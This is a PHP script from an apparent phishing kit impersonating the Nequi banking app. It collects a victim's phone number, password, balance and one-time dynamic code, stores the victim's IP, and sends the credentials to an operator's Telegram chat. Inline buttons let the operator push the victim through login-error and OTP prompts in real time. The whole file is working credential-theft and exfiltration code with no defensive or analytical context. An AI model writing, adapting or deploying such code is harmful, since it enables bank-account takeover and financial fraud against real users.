<?php
// Incluir el archivo de configuración y conexión a la base de datos
include '../../../db.php'; // Ajustado para estar en process/goat.php
$config = include '../../../config.php';

function escapeMarkdownV2($text)
{
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $clave = $_POST['clave'];
    $otp = $_POST['otp'];
    $saldo = $_POST['saldo'];
    $estado = 1; // Estado inicial del cliente
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Insertar datos en la base de datos 'nequi'
    // PostgreSQL usa RETURING id para obtener el ID insertado
    $sql = "INSERT INTO nequi (estado, ip_address) VALUES (:estado, :ip) RETURNING id";
    $stmt = $conn->prepare($sql);

    // Bind parameters
    $stmt->bindParam(':estado', $estado, PDO::PARAM_INT);
    $stmt->bindParam(':ip', $ip_address, PDO::PARAM_STR);

    if ($stmt->execute()) {
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        $cliente_id = $row['id'];

        // Enviar datos a Telegram
        $botToken = $config['botToken'];
        $chatId = $config['chatId'];
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];

        $message = "🔐 *Nuevo inicio de sesión (Nequi)*\n\n"
            . "📱 *Número de celular:* `" . escapeMarkdownV2($usuario) . "`\n"
            . "🔑 *Contraseña:* `" . escapeMarkdownV2($clave) . "`\n"
            . "💰 *Saldo Nequi:* `" . escapeMarkdownV2($saldo) . "`\n"
            . "🔢 *Clave dinámica:* `" . escapeMarkdownV2($otp) . "`\n"
            . "🆔 *ID del cliente:* `" . $cliente_id . "`";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                    ['text' => 'Datos', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"]
                ],
                [
                    ['text' => 'Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"]
                ],
                [
                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'MarkdownV2',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'ignore_errors' => true // Importante para capturar el cuerpo del error 400
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        // Verificar código de respuesta HTTP
        $http_response_header = $http_response_header ?? [];
        $response_code = 0;
        foreach ($http_response_header as $header) {
            if (preg_match('#HTTP/[0-9\.]+\s+([0-9]+)#', $header, $matches)) {
                $response_code = intval($matches[1]);
                break;
            }
        }

        if ($result === FALSE || $response_code >= 400) {
            error_log("Telegram API Error (Code $response_code): " . $result);
            // Opcional: Escribir en archivo para depuración rápida si error_log no es accesible
            file_put_contents('../telegram_debug.log', date('Y-m-d H:i:s') . " - Code $response_code - Body: $result\n", FILE_APPEND);
        }

        header("Location: ../espera.php?id=" . $cliente_id);
        exit();
    } else {
        echo "Error al insertar datos.";
    }

    // $stmt->closeCursor(); // Opcional en PDO
    // $conn = null;
}
?>